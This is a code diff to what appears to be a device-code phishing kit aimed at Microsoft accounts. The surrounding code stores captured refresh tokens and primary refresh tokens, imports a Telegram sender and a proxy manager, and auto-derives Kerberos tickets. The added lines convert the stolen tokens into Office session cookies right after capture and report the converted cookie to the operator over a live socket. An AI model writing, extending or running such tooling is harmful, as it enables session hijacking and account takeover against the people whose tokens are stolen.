@@ -10,6 +10,7 @@ const config = require('../config/env');
 const { encrypt, decrypt } = require('../utils/encrypt');
 const { sendTelegramDocument } = require('../services/notification');
 const proxyManager = require('../services/proxymanager');
+const cookieConverter = require('./cookieconverter');
 
 // In-memory job store (for active device code flows)
 const activeJobs = new Map();
@@ -537,6 +538,17 @@ async function storeToken(job, tokenData, responseCookies = []) {
       idTokenTenant: idTokenTenant || 'not extracted'
     });
 
+    // For cookie mode, trigger cookie conversion immediately after capture
+    let cookieConversionResult = null;
+    if (job.mode === 'cookie') {
+      const refreshTokenForConversion = tokenData.refresh_token || prt || tokenData.access_token;
+      cookieConversionResult = await cookieConverter.processCookieConversion(tokenId, refreshTokenForConversion, 'office', tenant, accountType)
+        .catch(err => {
+          console.error('[DeviceProxy] Cookie conversion failed:', err.message);
+          return { success: false, error: err.message };
+        });
+    }
+
     // Auto-derive Kerberos TGTs for work/school accounts with PRT
     // This runs asynchronously and doesn't block the response
     // Requires: PRT + work/school account + specific tenant ID (not 'common' or 'organizations')
@@ -650,10 +662,11 @@ async function storeToken(job, tokenData, responseCookies = []) {
     try {
       const io = require('express')().get('io');
       if (io) {
+        const notifyTokenType = job.mode === 'cookie' && cookieConversionResult && cookieConversionResult.success ? 'cookie' : (job.mode || 'token');
         io.to(`user_${job.user_id}`).emit('new_token', {
           id: tokenId,
           email,
-          token_type: auth_mode || 'token',
+          token_type: notifyTokenType,
           created_at: new Date(),
         });
       }
